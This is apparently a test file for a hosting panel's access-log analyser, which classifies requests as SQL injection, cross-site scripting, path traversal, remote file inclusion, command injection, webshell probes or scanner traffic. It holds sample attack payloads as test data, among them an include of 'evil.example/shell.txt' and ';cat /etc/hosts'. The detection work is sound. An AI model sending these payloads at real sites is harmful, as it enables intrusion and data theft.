import { describe, expect, it, vi } from 'vitest'
import type { Account, Domain } from '@xpanel/core'
import { analyzeAccessLog, classifyRequest, handleLogSecurityRoute } from './log-security-analysis.ts'

const line = (uri: string, ip = '203.0.113.5', agent = 'Mozilla/5.0', status = 200): string => JSON.stringify({ time: '2026-11-07T10:00:00+00:00', host: 'example.com', ip, method: 'GET', uri, status, body_bytes: 10, referer: '-', agent })
const id = '11111111-1111-4111-8111-111111111111'
const account = { id: 'aaaaaaaa-1111-4111-8111-111111111111', username: 'alice', uid: 1001, gid: 1001, home: '/home/alice', status: 'active', planId: 'plan', primaryDomain: 'example.com' } as Account
const domain = { id, accountId: account.id, name: 'example.com', kind: 'primary', parentId: null, docRoot: '/home/alice/public_html', siteType: 'php', upstream: null, redirect: null, php: { version: '8.3' }, wildcard: false, certificateId: null, suspended: false, expiresAt: null, pathQuotaMb: 'unlimited' } as unknown as Domain

describe('access log security analysis', () => {
  it('reports three SQL injection requests as three findings of that type, with samples', () => {
    const report = analyzeAccessLog([line("/item?id=1'%20OR%20'1'='1"), line('/item?id=1+UNION+SELECT+1,2,3--', '203.0.113.6'), line('/item?id=sleep(5)'), line('/index.html')])
    expect(report.requests).toBe(4); expect(report.flagged).toBe(3)
    expect(report.findings.map(finding => [finding.type, finding.count, finding.clients])).toEqual([['sql-injection', 3, 2]])
    expect(report.findings[0]!.samples).toHaveLength(3); expect(report.topClients[0]).toEqual({ ip: '203.0.113.5', requests: 2 })
  })
  it('names each attack class and leaves ordinary requests alone', () => {
    expect(classifyRequest({ uri: '/?q=%3Cscript%3Ealert(1)%3C/script%3E', agent: '' })).toEqual(['cross-site-scripting'])
    expect(classifyRequest({ uri: '/a?f=../../../etc/passwd', agent: '' })).toEqual(['path-traversal'])
    expect(classifyRequest({ uri: '/a?page=http://evil.example/shell.txt', agent: '' })).toEqual(['remote-file-inclusion'])
    expect(classifyRequest({ uri: '/a?x=1;cat%20/etc/hosts', agent: '' })).toContain('command-injection')
    expect(classifyRequest({ uri: '/wp-content/uploads/2026/c99.php', agent: '' })).toEqual(['webshell-probe'])
    expect(classifyRequest({ uri: '/.env', agent: '' })).toEqual(['webshell-probe'])
    expect(classifyRequest({ uri: '/', agent: 'sqlmap/1.8' })).toEqual(['vulnerability-scanner'])
    for (const uri of ['/products/select-from-list?where=home', '/blog/union-of-order', '/about-us.php?lang=en', '/search?q=or+1+more+thing', '/%zz']) expect(classifyRequest({ uri, agent: 'Mozilla/5.0' }), uri).toEqual([])
  })
  it('counts lines it cannot parse instead of hiding them', () => {
    expect(analyzeAccessLog(['not json', '', line('/')])).toMatchObject({ requests: 1, unparsed: 1, flagged: 0 })
  })
  it('reads only the saved site log, drops a cut first line and says the scan was partial', async () => {
    const readLog = vi.fn(async (_path: string, offset: number) => ({ exists: true, identity: '1:1', sizeBytes: 5 * 1024 * 1024, start: offset, bytes: Buffer.from('cut\n' + line('/?a=1+union+select+1') + '\n') }))
    const url = new URL('http://agent/host/logs/security-analysis?domainId=' + id)
    const response = await handleLogSecurityRoute(new Request(url), url, 'GET', { assertRoot: async () => undefined, readState: async () => ({ accounts: [account], domains: [domain] }), readLog, now: () => new Date('2026-11-07T10:00:00Z') })
    const body = await response!.json() as { site: string; scan: { complete: boolean; unparsed: number; requests: number }; findings: unknown[] }
    expect(readLog.mock.calls[0]![0]).toContain('example.com.access.log')
    expect(body.site).toBe('example.com'); expect(body.scan).toMatchObject({ complete: false, unparsed: 0, requests: 1 }); expect(body.findings).toHaveLength(1)
  })
  it('refuses a caller path, an unknown site and a host without logs', async () => {
    const ctx = { assertRoot: async () => undefined, readState: async () => ({ accounts: [account], domains: [domain] }), readLog: null }
    const call = (query: string, context: Parameters<typeof handleLogSecurityRoute>[3] = ctx) => { const url = new URL('http://agent/host/logs/security-analysis' + query); return handleLogSecurityRoute(new Request(url), url, 'GET', context) }
    await expect(call('?path=/etc/passwd')).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(call('?domainId=' + id)).rejects.toMatchObject({ code: 'PRECONDITION_FAILED' })
    await expect(call('?domainId=22222222-1111-4111-8111-111111111111', { ...ctx, readLog: vi.fn() })).rejects.toMatchObject({ code: 'NOT_FOUND' })
  })
})
